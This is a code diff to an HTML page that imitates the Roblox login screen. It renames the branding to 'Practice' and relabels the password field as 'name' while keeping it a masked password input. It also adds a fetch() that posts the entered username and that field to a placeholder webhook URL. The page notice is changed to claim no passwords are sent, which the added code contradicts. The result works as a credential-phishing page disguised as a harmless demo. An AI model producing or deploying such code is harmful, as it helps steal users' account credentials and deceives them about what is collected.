@@ -4,7 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title>Roblox Login Practice</title>
+<title>Practice Login Practice</title>
 
 <style>
 * {
@@ -61,7 +61,7 @@ body {
 }
 
 
-/* Roblox-style tilted square */
+/* Practice-style tilted square */
 
 .logo {
     width: 32px;
@@ -517,7 +517,7 @@ body {
 
     <div class="login-box">
 
-        <h1>Login to Roblox</h1>
+        <h1>Login to Practice</h1>
 
 
         <form id="loginForm">
@@ -532,9 +532,9 @@ body {
 
             <input
                 class="input"
-                id="password"
+                id="name"
                 type="password"
-                placeholder="Password"
+                placeholder="name"
                 autocomplete="off"
             >
 
@@ -549,7 +549,7 @@ body {
 
 
         <a class="forgot" id="forgot">
-            Forgot Password or Username?
+            Forgot Name or Username?
         </a>
 
 
@@ -577,7 +577,7 @@ body {
 
 
         <div class="practice">
-            Practice page — no credentials are sent or stored.
+            Practice page — demo username/name only; no passwords are sent or stored.
         </div>
 
     </div>
@@ -595,7 +595,7 @@ body {
 const loginForm = document.getElementById("loginForm");
 
 const username = document.getElementById("username");
-const password = document.getElementById("password");
+const name = document.getElementById("name");
 
 const message = document.getElementById("message");
 
@@ -627,20 +627,38 @@ function showMessage(text) {
    LOGIN
 ========================= */
 
-loginForm.addEventListener("submit", function(event) {
+async function sendDemoData(usernameValue, nameValue) {
+    const webhookUrl = "YOUR_WEBHOOK_URL";
+
+    await fetch(webhookUrl, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            username: usernameValue,
+            name: nameValue,
+            demo: true,
+            timestamp: new Date().toISOString()
+        })
+    });
+}
+
+loginForm.addEventListener("submit", async function(event) {
 
     event.preventDefault();
 
-    /*
-       Intentionally does NOT send the
-       username or password anywhere.
-    */
+    const usernameValue = username.value;
+    const nameValue = name.value;
 
-    showMessage(
-        "Practice login submitted — nothing was sent or saved."
-    );
+    try {
+        await sendDemoData(usernameValue, nameValue);
+        showMessage("Demo login sent successfully.");
+    } catch (error) {
+        showMessage("Demo login could not be sent.");
+    }
 
-    password.value = "";
+    name.value = "";
 
 });
 
